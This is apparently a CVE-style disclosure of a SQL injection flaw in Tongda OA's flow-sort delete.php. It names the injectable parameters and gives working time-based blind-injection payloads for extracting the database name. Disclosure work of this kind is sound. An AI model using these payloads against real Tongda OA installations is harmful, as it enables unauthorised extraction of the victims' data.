SQL injection vulnerability exists in Tongda OA

version：v2017 version and versions below v11.10

Route: general/system/approve_center/flow_sort/flow/delete.php

There are injected parameters: $id, $sort_parent

The code here is very concise. When $id and $sort_parent are not empty, the parameters are directly spliced ​​into the SQL statement, and no closure is required here.

![image](https://github.com/halleyakina/cve/assets/129704618/ebc74603-34e5-44c1-8545-99208422a9e6)

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/halleyakina/cve/assets/129704618/ee0ff178-de12-45fb-a081-3976f2fe4696)

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

POC
```
1%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/halleyakina/cve/assets/129704618/982a0aec-4d4f-4b6a-ab89-e5094b7f1791)
